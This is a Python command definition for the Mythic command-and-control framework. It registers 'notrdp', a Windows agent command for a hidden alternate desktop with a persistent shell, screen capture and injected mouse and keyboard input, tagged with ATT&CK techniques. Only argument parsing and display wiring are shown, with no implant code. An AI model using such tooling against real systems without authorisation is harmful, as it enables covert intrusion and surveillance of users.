from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class NotRdpArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="action",
                cli_name="Action",
                display_name="Action",
                type=ParameterType.ChooseOne,
                choices=["start", "shot", "input", "stop"],
                default_value="start",
                description="start: create hidden desktop; shot: capture screen; input: inject mouse/keyboard; stop: teardown",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
            CommandParameter(
                name="x",
                cli_name="X",
                display_name="Mouse X",
                type=ParameterType.Number,
                default_value=0,
                description="Mouse X coordinate (for input action only)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=2,
                    )
                ],
            ),
            CommandParameter(
                name="y",
                cli_name="Y",
                display_name="Mouse Y",
                type=ParameterType.Number,
                default_value=0,
                description="Mouse Y coordinate (for input action only)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=3,
                    )
                ],
            ),
            CommandParameter(
                name="mouse_action",
                cli_name="MouseAction",
                display_name="Mouse/Key Action",
                type=ParameterType.Number,
                default_value=0,
                description="0=move,1=lclick,2=rclick,3=dblclick,4=ldown,5=lup,6=rdown,7=rup,10=kpress,11=kdown,12=kup",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=4,
                    )
                ],
            ),
            CommandParameter(
                name="key",
                cli_name="Key",
                display_name="Virtual Key Code",
                type=ParameterType.Number,
                default_value=0,
                description="Virtual key code for keyboard input (e.g. 0x41 for 'A', 0x0D for Enter)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False,
                        group_name="Default",
                        ui_position=5,
                    )
                ],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("action", "start")
            return
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            # Simple string: "start" or "shot" or "stop"
            parts = self.command_line.strip().split()
            if parts and parts[0] in ("start", "shot", "stop"):
                self.add_arg("action", parts[0])
            elif parts and parts[0] == "input" and len(parts) >= 3:
                self.add_arg("action", "input")
                self.add_arg("x", int(parts[1]))
                self.add_arg("y", int(parts[2]))
                if len(parts) >= 4:
                    self.add_arg("mouse_action", int(parts[3]))
                if len(parts) >= 5:
                    self.add_arg("key", int(parts[4]))
            else:
                self.add_arg("action", self.command_line.strip())


class NotRdpCommand(CommandBase):
    cmd = "notrdp"
    needs_admin = False
    help_cmd = "notrdp [start|shot|stop] or notrdp input <x> <y> [action] [key]"
    description = (
        "Invisible alternate Windows desktop with screen capture and "
        "interactive mouse/keyboard input. start: create hidden desktop + "
        "explorer + persistent shell; shot: capture BMP screenshot; input: "
        "PostMessage-based mouse/keyboard injection; stop: teardown. "
        "Note: when the agent runs as SYSTEM in session 0, captures come "
        "back black (session 0 desktops do not render); launch the agent "
        "inside a user session for usable screenshots."
    )
    version = 1
    supported_ui_features = []
    author = "@operator"
    attackmapping = ["T1113", "T1562.001"]
    argument_class = NotRdpArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )
        action = taskData.args.get_arg("action")
        if action == "start":
            response.DisplayParams = "-Action start"
        elif action == "shot":
            response.DisplayParams = "-Action shot"
        elif action == "stop":
            response.DisplayParams = "-Action stop"
        elif action == "input":
            x = taskData.args.get_arg("x") or 0
            y = taskData.args.get_arg("y") or 0
            ma = taskData.args.get_arg("mouse_action") or 0
            key = taskData.args.get_arg("key") or 0
            response.DisplayParams = f"-Action input ({x},{y}) action={ma} key={key}"
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
